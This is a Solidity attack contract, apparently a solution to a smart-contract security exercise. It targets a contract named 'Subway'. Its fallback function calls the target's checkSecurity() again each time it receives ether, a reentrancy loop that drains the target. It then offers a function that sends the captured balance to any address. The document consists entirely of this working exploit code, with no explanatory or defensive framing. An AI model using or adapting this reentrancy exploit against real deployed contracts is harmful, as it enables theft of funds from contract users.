contract ByPassSubway {
    Subway originalContract;

    constructor (address payable _originalContract) public {
        originalContract = Subway(_originalContract);
    }
    
    function credit() public payable {
        bytes memory payload = abi.encodeWithSignature("credit()");
        address(originalContract).call.value(msg.value)(payload);
    }

    function exploit() public {
        originalContract.buyTickets(1);
        originalContract.checkSecurity();
    }

    function getBalanceOfContract() public view returns (uint256) {
        return (address(this).balance);
    }
    
    function withdrawAllTheBalance(address payable _to) public {
        _to.transfer(address(this).balance);
    }

    fallback () external payable {
        originalContract.checkSecurity();
    }
}
